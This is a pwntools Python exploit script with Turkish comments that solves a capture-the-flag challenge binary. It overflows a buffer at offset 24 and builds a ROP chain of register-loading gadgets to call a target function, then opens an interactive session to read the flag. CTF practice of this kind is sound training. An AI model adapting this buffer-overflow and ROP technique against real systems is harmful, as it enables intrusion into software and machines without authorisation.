from pwn import *


#terminalde script'i GDB,REMOTE,LOCAL modlarında çalıştırmak için:
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


#binary dosyasının mimarisini ayarlamak için:
exe = './chal' #dosya adı
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug' #olan biteni anlamak için

#####################################
# exploit'i buradan sonra yazacağız #
#####################################

#BOF için gdb'den öğrendiğimiz offsetimizi buraya yazıyoruz:
offset = 24

#ropper'dan öğrendiğimiz gadget adreslerini buraya yazıyoruz:
pop_rdi = 0x401289
pop_rdx = 0x401287
pop_rsi = 0x401285

#programı başlatıyoruz:
io = start()

#payload'ı oluşturuyoruz:
payload = flat({
    offset: [
        pop_rdi,  # Pop the next value to RDI
        0xdeadbeefdeadbeef,
        pop_rsi,  # Pop the next value to RSI (and junk into R15)
        0xc0debabec0debabe,
        pop_rdx,
        0xcacadadacacadada,
        # With params in correct registers, call hacked function
        0x401176
    ]
})


#payload'ımızı yolluyoruz:
io.sendlineafter(b'name:', payload)

#flag'i okuyabilmek için interaktif moda geçiyoruz:
io.interactive()